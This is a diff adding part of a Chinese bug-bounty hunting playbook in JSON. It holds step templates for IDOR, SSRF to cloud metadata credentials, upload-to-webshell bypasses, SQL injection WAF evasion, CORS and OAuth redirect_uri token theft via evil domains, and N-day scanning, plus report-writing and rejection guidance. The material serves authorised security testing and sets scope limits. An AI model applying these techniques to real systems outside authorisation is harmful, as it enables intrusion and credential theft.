+   "expected_priority": "P1",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-04",
+   "scene": "水平/垂直越权",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "注册 A、B 两个测试账号，A 登录抓包",
+    "水平：把 user_id/order_id/phone 从 A 的值改成 B 的值，看能否读/改 B 的数据",
+    "垂直：用普通用户 A 的 Cookie 直接调管理员接口，或改 Role:user→admin",
+    "遍历：ID 从自增 1 开始遍历，统计可获取的数据量与字段敏感度",
+    "判定：核心数据任意遍历＝P0/P1；非核心少量越权＝P2/P3"
+   ],
+   "tools": [
+    "Burp",
+    "双测试账号"
+   ],
+   "common_pitfall": "同一功能增删改查越权只报 1 个（避免合并降权）",
+   "related_vuln_type": "idor,minor_idor",
+   "compliance_redline": "仅用自建测试账号数据验证，不遍历真实用户隐私",
+   "expected_priority": "P1",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-05",
+   "scene": "SSRF 打内网 / 云元数据",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "找所有服务端取 URL 的功能：图片转存、网址预览、webhook、PDF 生成、导入远程文件",
+    "基础验证：URL 改 127.0.0.1/内网 IP 看回显（区分真 SSRF 与伪 SSRF）",
+    "打云元数据：http://100.100.100.200/（阿里云）/http://169.254.169.254/latest/meta-data/（AWS），读临时 AK/SK",
+    "进阶：gopher 协议打内网 Redis/Memcached；dict 探测端口；DNS rebinding 绕白名单",
+    "回显受限：用 OOB（DNSLog/带外平台）确认盲 SSRF",
+    "判定：可进核心网络代理或可回显＝高危；仅能读自身无进一步利用＝降级"
+   ],
+   "tools": [
+    "Burp Collaborator",
+    "DNSLog",
+    "gopher 协议"
+   ],
+   "common_pitfall": "真 SSRF vs 伪 SSRF（仅展示固定域名）；IMDSv2 需 token 打不动",
+   "related_vuln_type": "ssrf",
+   "compliance_redline": "不探测与目标无关的内网资产；云凭据只验证不滥用",
+   "expected_priority": "P1",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-06",
+   "scene": "文件上传绕过 getshell",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "找上传点（头像/附件/富文本/导入），抓包",
+    "绕扩展名：.phtml/.php5/.pHp 大小写、.jpg.php、.htaccess、.user.ini",
+    "绕 Content-Type：filename=shell.php 但 Content-Type: image/jpeg",
+    "绕内容校验：图片马（GIF89a 头）、二次渲染绕过、截断 %00",
+    "上传后访问路径确认解析，执行 whoami 证明"
+   ],
+   "tools": [
+    "Burp",
+    "图片马",
+    "冰蝎/哥斯拉（报备后）"
+   ],
+   "common_pitfall": "二次渲染破坏马内容",
+   "related_vuln_type": "file_upload",
+   "compliance_redline": "字节等平台文件上传须提前报备；拿 webshell 后漏洞盒子禁止下载源码审计",
+   "expected_priority": "P1",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-07",
+   "scene": "注入（SQL）绕 WAF",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "探测点：URL 参数、表单、JSON body、HTTP 头（User-Agent/Referer）",
+    "输入 ' / and 1=1 / and 1=2 看报错与页面变化",
+    "无回显：时间盲注 if(1=1,sleep(5),1)、布尔盲注逐字符猜解",
+    "绕 WAF：内联注释 /*!*/、大小写混写、编码（URL/双重/Hex）、分块、等价函数",
+    "只注出 1 条数据证明危害即停；判定：核心库＝高危，非核心＝中危，报错无数据＝拒收"
+   ],
+   "tools": [
+    "sqlmap",
+    "Burp",
+    "手工盲注脚本"
+   ],
+   "common_pitfall": "拖库被处罚；WAF 拦截误判为不存在",
+   "related_vuln_type": "sqli",
+   "compliance_redline": "严禁 information_schema 全拖库（漏洞盒子明确严禁）；字节注入禁读表",
+   "expected_priority": "P0",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-08",
+   "scene": "JSONP / CORS 配置类",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "JSONP：找 ?callback=xxx 接口，看是否返回敏感数据且 callback 未校验来源",
+    "CORS：发 Origin: https://evil.com，看 ACAO 是否反射且 Allow-Credentials: true",
+    "构造 PoC 页面跨域读取敏感接口数据",
+    "判定：能劫持敏感信息（手机号/订单）＝中危；仅非 Chrome 触发/无敏感数据＝低危/拒收"
+   ],
+   "tools": [
+    "Burp",
+    "PoC 页面"
+   ],
+   "common_pitfall": "无凭据的 CORS 反射无危害",
+   "related_vuln_type": "xss",
+   "compliance_redline": "PoC 只读自建账号数据",
+   "expected_priority": "P3",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-09",
+   "scene": "SSO / 联合登录",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "梳理 OAuth/CAS/SSO 授权流程：authorize→callback→token",
+    "测 callback 地址是否校验（改 redirect_uri 到 evil 域名偷 code/token）",
+    "测 state 参数是否缺失（CSRF 绑定他人账号）",
+    "测登出后 token 是否失效、跨子域 cookie 作用域过宽",
+    "判定：可劫持他人登录态/账号绑定＝高危"
+   ],
+   "tools": [
+    "Burp"
+   ],
+   "common_pitfall": "redirect_uri 多级校验（后缀/包含匹配绕过）",
+   "related_vuln_type": "account_takeover",
+   "compliance_redline": "只劫持自建账号验证",
+   "expected_priority": "P1",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-10",
+   "scene": "测试环境 / 内部系统 / 供应链 N-day",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "测试/预发环境：子域名/历史 DNS 找 test./uat./pre./dev. 子域，常缺 WAF/弱口令/调试接口开放",
+    "内部系统：oa./admin./crm./jenkins./gitlab./wiki. 未授权或弱口令",
+    "供应链 N-day：识别组件版本（Struts2/Log4j/Fastjson/Shiro/Confluence），对照最新 CVE 打 PoC；N-day 红利期短，爆发后第一时间扫资产",
+    "0day vs N-day 取舍：量产优先 N-day（命中率高、周期短）；高价值目标深耕 0day（ASRC 0Day 须有实际影响案例）"
+   ],
+   "tools": [
+    "Nmap",
+    "nuclei",
+    "CVE PoC 库"
+   ],
+   "common_pitfall": "测试环境漏洞可能被判定无效（ASRC）",
+   "related_vuln_type": "rce,unauthorized_access,weak_password",
+   "compliance_redline": "N-day 扫描控制频率；确认资产归属再测",
+   "expected_priority": "P0~P2",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  }
+ ],
+ "exp_report_templates": [
+  {
+   "template_id": "RPT-SIX-SECTION-001",
+   "kind": "six_section",
+   "platform": "",
+   "title": "SRC 漏洞报告六段式标准模板",
+   "structure": [
+    {
+     "name": "标题",
+     "guidance": "[平台/业务]+漏洞类型+影响对象，如「抖音某用户中心接口存在水平越权可遍历任意用户手机号」；带「任意用户/批量/未授权/RCE/越权」关键词"
+    },
+    {
+     "name": "漏洞描述",
+     "guidance": "非技术语言讲清「在哪发现→怎么利用→影响范围」，点明业务危害（可泄露哪些敏感数据/可造成多少资损）"
+    },
+    {
+     "name": "危害等级判定",
+     "guidance": "对照平台标准自评严重/高/中/低并给理由；照抄平台资产档×漏洞类型表对应奖励档自评（别夸大也别压低）"
+    },
+    {
+     "name": "复现步骤",
+     "guidance": "编号分步，每步配 HTTP 请求包文本+截图（含 URL、Payload、响应结果、时间戳），审核员照做即可复现"
+    },
+    {
+     "name": "影响范围证明",
+     "guidance": "数据打码后展示泄露字段（证明≥3 敏感字段）/whoami 回显/订单金额篡改前后对比"
+    },
+    {
+     "name": "修复建议",
+     "guidance": "可落地：接口加 user_id 与登录态绑定校验/金额服务端重算/SSRF 目标地址白名单等"
+    }
+   ],
+   "example": "标题示例：某接口越权导致任意用户订单信息泄露",
+   "source": "设计书附录C-4.2（Bug Bounty Playbook + 各平台规则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-WRITING-001",
+   "kind": "writing_rule",
+   "platform": "",
+   "title": "撰写规范（标题/定级/截图/PoC/AI 标记）",
+   "structure": [
+    {
+     "name": "标题命名",
+     "guidance": "带高价值关键词，避免模糊标题"
+    },
+    {
+     "name": "定级对照",
+     "guidance": "能刷钱/接管主账号/核心库拖数据→严重；越权改核心数据/RCE 生产机→高危；少量敏感数据/需交互→中危"
+    },
+    {
+     "name": "截图要求",
+     "guidance": "带时间戳、敏感数据打码"
+    },
+    {
+     "name": "PoC 要求",
+     "guidance": "可一键复现脚本/完整请求包（TSRC 复杂链路+PoC 可拿最高 5000 高质量报告奖）"
+    },
+    {
+     "name": "AI 报告标记",
+     "guidance": "AI 辅助生成须经人工复现并附完整 PoC+截图（字节 2026 立规，未人工复现无效）"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.3/4.4/5.4",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-REJECT-001",
+   "kind": "rejection",
+   "platform": "",
+   "title": "重复提交",
+   "structure": [
+    {
+     "name": "规避方法",
+     "guidance": "提交前查平台已有漏洞列表/已公开细节；同漏洞源只报 1 个；被标重复要原报告号，参数/端点/链路不同则具体申诉"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.4 常见被驳回原因与规避",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-REJECT-002",
+   "kind": "rejection",
+   "platform": "",
+   "title": "无实际危害 / 自证型",
+   "structure": [
+    {
+     "name": "规避方法",
+     "guidance": "必须给成功案例+危害量化（截图证明拿到敏感数据/造成资损），不只写「理论可行」"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.4 常见被驳回原因与规避",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-REJECT-003",
+   "kind": "rejection",
+   "platform": "",
+   "title": "不可复现",
+   "structure": [
+    {
+     "name": "规避方法",
+     "guidance": "自己先完整跑一遍；步骤+请求包+截图齐全含时间戳；不直接交 AI 草稿（字节明确 AI 报告须人工复现）"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.4 常见被驳回原因与规避",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-REJECT-004",
+   "kind": "rejection",
+   "platform": "",
+   "title": "配置类 / 纯信息泄露",
+   "structure": [
+    {
+     "name": "规避方法",
+     "guidance": "只提交能进一步利用的泄露（含敏感数据≥3 字段），纯 phpinfo/目录遍历不提交"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.4 常见被驳回原因与规避",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-REJECT-005",
+   "kind": "rejection",
+   "platform": "",
+   "title": "超出授权范围",
+   "structure": [
+    {
+     "name": "规避方法",
+     "guidance": "严格在 SRC 公告资产内测；敏感测试先报备（字节）；不碰未授权资产"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.4 常见被驳回原因与规避",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-REJECT-006",
+   "kind": "rejection",
+   "platform": "",
+   "title": "拖库/下载源码/高并发",
+   "structure": [
+    {
+     "name": "规避方法",
+     "guidance": "只注 1 条数据；拿 webshell 先问平台；禁高并发与 DoS"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.4 常见被驳回原因与规避",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "RPT-REJECT-007",
+   "kind": "rejection",
+   "platform": "",
+   "title": "与已有漏洞源合并",
+   "structure": [
+    {
+     "name": "规避方法",
+     "guidance": "同接口/同上传组件/同验证码失效导致的多洞合并报 1 个，避免被降权"
+    }
+   ],
+   "example": "",
+   "source": "设计书附录C-4.4 常见被驳回原因与规避",
+   "last_verified": "2026-10-09"
+  }
+ ]
+}
